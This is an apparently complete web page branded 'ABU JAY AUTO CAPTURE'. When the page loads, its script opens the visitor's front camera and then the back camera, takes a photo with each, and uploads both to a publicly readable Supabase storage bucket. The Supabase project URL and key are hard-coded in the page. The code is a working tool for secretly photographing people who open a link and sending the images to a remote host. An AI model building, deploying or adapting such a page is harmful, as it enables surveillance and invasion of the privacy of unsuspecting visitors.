<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ABU JAY</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background: #0a0a0f;
            color: #ffffff;
            min-height: 100vh;
            overflow: hidden;
        }

        #loadingScreen {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: #0a0a0f;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 9999;
            transition: opacity 0.8s ease;
        }

        #loadingScreen.hide {
            opacity: 0;
            pointer-events: none;
        }

        .loading-icon {
            width: 100px;
            height: 100px;
            background: #6c2bd9;
            border-radius: 28px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 28px;
            box-shadow: 0 12px 48px rgba(108, 43, 217, 0.35);
        }

        .loading-icon svg {
            width: 56px;
            height: 56px;
            fill: none;
            stroke: #ffffff;
            stroke-width: 3;
            stroke-linecap: round;
            stroke-linejoin: round;
        }

        .loading-title {
            font-size: 36px;
            font-weight: 700;
            color: #c084fc;
            letter-spacing: 3px;
        }

        .loading-title span {
            color: #ffffff;
        }

        .loading-sub {
            font-size: 13px;
            color: rgba(255, 255, 255, 0.2);
            margin-top: 8px;
            letter-spacing: 4px;
        }

        .progress-ring {
            width: 48px;
            height: 48px;
            border-radius: 50%;
            border: 3px solid rgba(108, 43, 217, 0.15);
            border-top-color: #6c2bd9;
            animation: spin 0.8s linear infinite;
            margin-top: 32px;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        #mainContent {
            display: none;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 24px;
            text-align: center;
        }

        #mainContent.show {
            display: flex;
        }

        h1 {
            font-size: 28px;
            color: #c084fc;
            margin-bottom: 4px;
        }

        h1 span {
            color: #ffffff;
        }

        .subtitle {
            color: rgba(255, 255, 255, 0.2);
            font-size: 14px;
            margin-bottom: 24px;
        }

        .status {
            font-size: 22px;
            color: #c084fc;
            margin: 16px 0;
            min-height: 60px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
        }

        .status .spinner {
            display: none;
            width: 28px;
            height: 28px;
            border: 3px solid rgba(108, 43, 217, 0.15);
            border-top-color: #6c2bd9;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        .status.loading .spinner {
            display: inline-block;
        }

        .status.success {
            color: #22c55e;
        }

        .status.error {
            color: #f87171;
        }

        .status.uploading {
            color: #fbbf24;
        }

        #camera {
            display: none;
        }

        .photo-count {
            color: rgba(255, 255, 255, 0.15);
            font-size: 14px;
            margin-top: 12px;
        }

        .photo-count span {
            color: #c084fc;
        }

        @media (max-width: 480px) {
            h1 {
                font-size: 22px;
            }
            .status {
                font-size: 18px;
            }
            .loading-title {
                font-size: 28px;
            }
            .loading-icon {
                width: 80px;
                height: 80px;
            }
            .loading-icon svg {
                width: 44px;
                height: 44px;
            }
        }
    </style>
</head>
<body>

    <div id="loadingScreen">
        <div class="loading-icon">
            <svg viewBox="0 0 24 24">
                <rect x="3" y="3" width="18" height="18" rx="4" />
                <line x1="9" y1="9" x2="15" y2="15" />
                <line x1="15" y1="9" x2="9" y2="15" />
            </svg>
        </div>
        <div class="loading-title">ABU <span>JAY</span></div>
        <div class="loading-sub">AUTO CAPTURE</div>
        <div class="progress-ring"></div>
    </div>

    <div id="mainContent">
        <h1><span>ABU</span> JAY</h1>
        <p class="subtitle">Capturing front and back photos automatically</p>

        <div class="status" id="status">
            <span>Initializing...</span>
            <span class="spinner"></span>
        </div>

        <div class="photo-count">
            <span id="countDisplay">0</span> photos stored
        </div>

        <video id="camera" autoplay playsinline></video>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2">
    </script>

    <script>
        (function() {
            'use strict';

            const SUPABASE_URL = 'https://bnslykqanegcicpdddzj.supabase.co';
            const SUPABASE_ANON_KEY = 'sb_publishable_opxwfbItjYqgtUjk1T7T1A_OwzE4q6w';
            const BUCKET_NAME = 'Photos';

            const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

            const loadingScreen = document.getElementById('loadingScreen');
            const mainContent = document.getElementById('mainContent');
            const video = document.getElementById('camera');
            const statusEl = document.getElementById('status');
            const countDisplay = document.getElementById('countDisplay');

            let cameraStream = null;

            function setStatus(message, type) {
                statusEl.textContent = message;
                statusEl.className = 'status';
                if (type) {
                    statusEl.classList.add(type);
                }
                if (type !== 'loading') {
                    statusEl.classList.remove('loading');
                }
            }

            function updateCount() {
                // Updated after upload
            }

            function hideLoading() {
                loadingScreen.classList.add('hide');
                setTimeout(function() {
                    mainContent.classList.add('show');
                }, 400);
            }

            async function uploadToSupabase(imageData, label) {
                try {
                    const response = await fetch(imageData);
                    const blob = await response.blob();
                    const fileName = 'public/' + label + '-' + Date.now() + '.jpg';

                    const { data, error } = await supabase.storage
                        .from(BUCKET_NAME)
                        .upload(fileName, blob, {
                            cacheControl: '3600',
                            upsert: false
                        });

                    if (error) {
                        throw new Error(error.message);
                    }

                    const { data: urlData } = supabase.storage
                        .from(BUCKET_NAME)
                        .getPublicUrl(fileName);

                    return urlData.publicUrl;

                } catch (err) {
                    throw new Error('Upload failed: ' + err.message);
                }
            }

            function capturePhoto(label) {
                return new Promise(function(resolve, reject) {
                    try {
                        const canvas = document.createElement('canvas');
                        const ctx = canvas.getContext('2d');
                        const width = video.videoWidth || 640;
                        const height = video.videoHeight || 480;
                        canvas.width = width;
                        canvas.height = height;
                        ctx.drawImage(video, 0, 0, width, height);

                        const photoData = canvas.toDataURL('image/jpeg', 0.92);
                        resolve(photoData);
                    } catch (err) {
                        reject(err);
                    }
                });
            }

            function startCamera(facingMode) {
                return new Promise(function(resolve, reject) {
                    if (cameraStream) {
                        cameraStream.getTracks().forEach(t => t.stop());
                        cameraStream = null;
                        video.srcObject = null;
                    }

                    navigator.mediaDevices.getUserMedia({
                        video: {
                            facingMode: facingMode,
                            width: { ideal: 640 },
                            height: { ideal: 480 }
                        },
                        audio: false
                    })
                    .then(function(stream) {
                        cameraStream = stream;
                        video.srcObject = stream;
                        video.play();

                        video.onloadedmetadata = function() {
                            resolve();
                        };
                        setTimeout(resolve, 500);
                    })
                    .catch(function(err) {
                        reject(err);
                    });
                });
            }

            async function runCaptureProcess() {
                let uploadedCount = 0;

                try {
                    setStatus('Starting front camera...', 'loading');
                    await startCamera('user');
                    setStatus('Capturing front photo...', 'loading');
                    await new Promise(r => setTimeout(r, 500));
                    const frontPhoto = await capturePhoto('Front');

                    setStatus('Uploading front photo...', 'uploading');
                    await uploadToSupabase(frontPhoto, 'front');
                    uploadedCount++;
                    setStatus('Front photo uploaded (' + uploadedCount + ' total)', 'success');

                    await new Promise(r => setTimeout(r, 500));

                    setStatus('Starting back camera...', 'loading');
                    await startCamera('environment');
                    setStatus('Capturing back photo...', 'loading');
                    await new Promise(r => setTimeout(r, 500));
                    const backPhoto = await capturePhoto('Back');

                    setStatus('Uploading back photo...', 'uploading');
                    await uploadToSupabase(backPhoto, 'back');
                    uploadedCount++;
                    setStatus('Back photo uploaded (' + uploadedCount + ' total)', 'success');

                    if (cameraStream) {
                        cameraStream.getTracks().forEach(t => t.stop());
                        cameraStream = null;
                        video.srcObject = null;
                    }

                    countDisplay.textContent = uploadedCount;
                    setStatus('Both photos uploaded to Supabase! (' + uploadedCount + ' total)', 'success');

                } catch (err) {
                    setStatus('Error: ' + err.message, 'error');
                    console.error('Capture error:', err);
                }
            }

            window.addEventListener('load', function() {
                setTimeout(function() {
                    hideLoading();
                    setTimeout(runCaptureProcess, 600);
                }, 1800);
            });

            window.addEventListener('beforeunload', function() {
                if (cameraStream) {
                    cameraStream.getTracks().forEach(t => t.stop());
                    cameraStream = null;
                }
            });

            console.log('ABU JAY loaded — uploading to Supabase');

        })();
    </script>

</body>
    </html>
